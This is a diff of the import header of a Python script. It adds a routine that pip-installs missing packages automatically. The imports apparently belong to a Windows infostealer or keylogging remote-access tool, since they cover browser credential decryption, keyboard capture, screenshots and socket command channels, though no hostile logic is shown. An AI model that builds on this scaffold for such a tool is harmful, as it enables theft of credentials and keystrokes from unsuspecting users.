@@ -1,37 +1,97 @@
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-import os
 import sys
-import json
-import base64
-import sqlite3
-import time
-import platform
 import subprocess
-import random
-import io
-import logging
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import requests
-import pyautogui
-import win32crypt
-import winreg
-from datetime import datetime, timedelta
-import shutil
-import ctypes
-import psutil
-import socket
-import threading
-import select
-from pynput import keyboard
-import configparser
-import xml.etree.ElementTree as ET
-import socketio
-import websocket
-import random, inspect, tempfile
-import multiprocessing
-from ctypes import wintypes
+import platform
+
+def install_module(module_name, pip_name=None):
+    """Helper function to install missing modules"""
+    pip_name = pip_name or module_name
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
+        print(f"Successfully installed {module_name}")
+        return True
+    except subprocess.CalledProcessError:
+        print(f"Failed to install {module_name}")
+        return False
+
+# List of required modules with their pip names if different
+required_modules = [
+    ('urllib3', None),
+    ('Crypto', 'pycryptodome'),
+    ('requests', None),
+    ('pyautogui', None),
+    ('win32crypt', 'pywin32'),
+    ('psutil', None),
+    ('keyboard', 'pynput'),
+    ('socketio', 'python-socketio'),
+    ('websocket', 'websocket-client')
+]
+
+# Check and install missing modules
+for module, pip_name in required_modules:
+    try:
+        if module == 'wintypes':
+            import ctypes
+            from ctypes import wintypes
+        elif module == 'datetime':
+            from datetime import datetime, timedelta
+        elif module == 'xml.etree.ElementTree':
+            import xml.etree.ElementTree as ET
+        elif module == 'Crypto':
+            from Crypto.Cipher import AES
+            from Crypto.Util.Padding import pad, unpad
+        elif module == 'keyboard':
+            from pynput import keyboard
+        else:
+            __import__(module.split('.')[0])
+    except ImportError:
+        print(f"Module {module} not found. Attempting to install...")
+        if pip_name:
+            install_module(module, pip_name)
+        else:
+            install_module(module)
+
+# Now proceed with the imports
+try:
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    import os
+    import sys
+    import json
+    import base64
+    import sqlite3
+    import time
+    import platform
+    import subprocess
+    import random
+    import io
+    import logging
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad, unpad
+    import requests
+    import pyautogui
+    import win32crypt
+    import winreg
+    from datetime import datetime, timedelta
+    import shutil
+    import ctypes
+    import psutil
+    import socket
+    import threading
+    import select
+    from pynput import keyboard
+    import configparser
+    import xml.etree.ElementTree as ET
+    import socketio
+    import websocket
+    import tempfile
+    import multiprocessing
+    from ctypes import wintypes
+    
+    print("All modules imported successfully!")
+except ImportError as e:
+    print(f"Failed to import module: {e}")
+    sys.exit(1)
+
 
 
 # ======================
